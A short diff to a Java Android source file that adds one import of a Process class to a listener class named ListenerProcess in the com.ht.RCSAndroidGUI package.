@@ -1,5 +1,7 @@
 package com.ht.RCSAndroidGUI.listener;
 
+import com.ht.RCSAndroidGUI.Process;
+
 public class ListenerProcess extends Listener<Process> {
 	/** The Constant TAG. */
 	private static final String TAG = "ListenerProcess";
